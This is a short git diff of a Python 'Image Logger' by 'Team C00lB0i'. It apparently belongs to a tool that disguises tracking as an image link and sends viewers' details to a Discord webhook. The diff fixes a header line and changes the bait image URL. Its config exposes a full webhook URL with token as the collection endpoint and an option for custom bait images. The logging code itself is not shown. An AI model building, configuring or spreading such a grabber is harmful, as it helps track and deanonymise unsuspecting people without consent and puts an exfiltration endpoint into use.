@@ -1,4 +1,4 @@
-n # Image Logger
+# Image Logger
 # By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
 
 from http.server import BaseHTTPRequestHandler
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1475739421503655989/2tFea57YMeFnTKWx88K_q-M_ra8GULa53DNxJbd2vr_ED45NBn5jng5RlFgIb9aFca6w",
-    "image": "https://i.etsystatic.com/27170323/r/il/5fe46d/4307323489/il_570xN.4307323489_79yp.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.etsystatic.com/21009977/r/il/30a268/6308516209/il_570xN.6308516209_1nsl.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
